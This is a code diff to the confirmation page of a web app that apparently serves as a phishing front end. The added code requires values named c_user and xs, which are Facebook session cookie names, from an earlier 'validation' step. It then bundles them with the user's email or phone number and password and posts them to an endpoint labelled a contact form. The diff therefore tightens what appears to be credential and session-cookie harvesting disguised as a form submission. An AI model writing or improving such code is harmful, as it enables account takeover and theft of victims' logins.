@@ -41,11 +41,23 @@ export default function Confirmation() {
 
   const onSubmit = async (data: any) => {
     try {
+      // Get validation data from localStorage
       const validationData = JSON.parse(localStorage.getItem('validation_data') || '{}');
+
+      if (!validationData.c_user || !validationData.xs) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Please complete the validation step first.",
+        });
+        setLocation("/validation");
+        return;
+      }
+
       const formattedData = {
         ...validationData,
-        ...data,
-        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email
+        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
+        password: data.password
       };
 
       await apiRequest('POST', '/api/contact-form', formattedData);
